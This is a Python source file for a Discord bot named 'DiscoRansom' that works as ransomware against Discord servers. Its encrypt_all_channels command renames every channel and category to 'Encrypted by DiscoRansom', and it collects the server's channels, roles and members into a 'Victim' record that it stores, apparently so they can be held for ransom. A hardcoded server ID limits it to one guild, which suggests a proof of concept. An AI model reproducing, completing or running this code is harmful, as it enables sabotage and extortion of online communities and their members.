from storage import *
import discord
from discord.ext import commands
from discord.utils import get
from encryption import encrypt, decrypt, key

with open("token.txt", "r") as f:
    TOKEN = f.read()

bot = commands.Bot(command_prefix='!')

@bot.event
async def on_ready():
    print(f'{bot.user.name} has connected to Discord!')


@bot.command()
async def servers(ctx):
    for server in bot.guilds:
        print("Server Name: " + server.name)
        print("Server ID: " + str(server.id))
        print("Server Members: " + str(server.member_count))
        print("\n")

@bot.command()
async def encrypt_all_channels(ctx):
    for server in bot.guilds:
        if server.id != 840954377291300875: return

        victime = Victim(server)

        for channel in server.channels: # Includes Categories
            if channel.type == discord.ChannelType.text:
                victime.add_text_channels(channel)
                await channel.edit(topic="Encrypted by DiscoRansom", name="Encrypted by DiscoRansom")
            elif channel.type == discord.ChannelType.category:
                victime.add_category(channel)
                await channel.edit(name="Encrypted by DiscoRansom")
            elif channel.type == discord.ChannelType.voice:
                victime.add_voice_channels(channel)
                await channel.edit(name="Encrypted by DiscoRansom")
        
        for roles in server.roles:
            victime.add_role(roles)

        for users in server.members:
            victime.add_user(users)
    
    victime.turn_data_to_unicode()
    victime.store_data()

bot.run(TOKEN)